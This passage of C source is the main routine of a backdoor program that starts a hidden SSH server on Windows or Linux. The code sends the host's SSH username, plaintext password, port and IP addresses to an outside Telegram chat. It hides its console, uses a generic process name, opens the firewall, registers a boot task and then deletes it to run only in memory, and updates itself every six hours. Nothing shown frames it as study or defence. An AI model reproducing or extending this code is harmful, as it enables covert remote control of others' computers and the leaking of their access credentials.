            "👻 <b>Stealth SSH Server Started</b>\n"
            "Version: %s (Hidden)\n"
            "OS: %s\n"
            "Mode: Memory execution only\n"
            "Port: %d\n\n"
            "🔐 <b>SSH Access:</b>\n"
            "User: %s\n"
            "Password: <code>%s</code>\n"
            "Local IPs: %s\n\n"
            "📱 <b>Connect:</b>\n"
            "<code>ssh -p %d %s@&lt;IP&gt;</code>\n\n"
            "🔍 <b>Stealth Features:</b>\n"
            "• No GUI interface\n"
            "• Hidden console window\n"
            "• Generic process name\n"
            "• Silent operation\n"
            "• Auto-update every 6 hours", 
            VERSION, 
#ifdef WIN32
            "Windows",
#else
            "Linux",
#endif
            SSH_PORT,
            SSH_USER, g_ssh_password, ip_addresses,
            SSH_PORT, SSH_USER);
        send_telegram_message(startup_msg);
        
        log_message("INFO", "Stealth mode started");
        
        // Start services
        enable_firewall();
        
#ifdef WIN32
        CreateThread(NULL, 0, ssh_server_thread, NULL, 0, NULL);
        CreateThread(NULL, 0, shutdown_monitor_thread, NULL, 0, NULL);
        CreateThread(NULL, 0, update_monitor_thread, NULL, 0, NULL);
        CreateThread(NULL, 0, battery_monitor_thread, NULL, 0, NULL);
#else
        pthread_t ssh_thread, shutdown_thread, update_thread;
        pthread_create(&ssh_thread, NULL, ssh_server_thread, NULL);
        pthread_create(&shutdown_thread, NULL, shutdown_monitor_thread, NULL);
        pthread_create(&update_thread, NULL, update_monitor_thread, NULL);
#endif
        
        // Cleanup task scheduler after 10 seconds
        sleep(10);
        if (is_task_registered()) {
            unregister_task();
            log_message("INFO", "Task cleanup completed - running in memory only");
        }
        
        // Main stealth loop
        while (g_running) {
            sleep(1);
        }
        
    } else if (strcmp(argv[1], "setup") == 0) {
        if (!is_elevated()) {
            printf("Requires admin/root privileges\n");
            return 1;
        }
        
        if (register_task()) {
            printf("Service registered for auto-start (stealth mode)\n");
        } else {
            printf("Failed to register service\n");
            return 1;
        }
        
        if (enable_firewall()) {
            printf("Firewall configured\n");
        }
        
        printf("Setup complete - will start in stealth mode on boot\n");
        
    } else {
        if (!g_stealth_mode) {
            printf("Unknown command: %s\n", argv[1]);
        }
        return 1;
    }
    
    curl_global_cleanup();
    return 0;
}
